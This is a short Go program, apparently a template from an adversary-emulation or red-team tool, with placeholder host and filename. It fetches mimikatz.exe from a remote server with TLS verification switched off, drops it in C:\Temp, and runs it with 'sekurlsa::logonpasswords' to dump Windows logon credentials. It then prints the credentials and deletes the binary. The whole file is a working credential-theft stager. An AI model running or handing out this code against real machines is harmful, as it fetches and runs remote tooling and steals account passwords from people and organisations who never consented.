package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var TempDir = "C:\\Temp"
var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"

func GETHELPER() error {
	jobUuid := os.Args[1]
	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/mimikatz.exe", nil)
	if err != nil {
		return err
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return err
	}
	err = WRITEMIMIKATZFILETOTEMPDIR(string(respBody))
	if err != nil {
		return err
	}
	return nil
}

func WRITEMIMIKATZFILETOTEMPDIR(data string) error {
	err := os.MkdirAll(TempDir, os.ModePerm)
	if err != nil {
		return err
	}
	file, err := os.Create(MimikatzFullPath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}
	return file.Sync()
}

func RUNMIMIKATZ() {
	err := GETHELPER()
	if err != nil {
		fmt.Println(err)
	}
	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(mimikatzOut))
	err = os.Remove(MimikatzFullPath)
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	RUNMIMIKATZ()
}
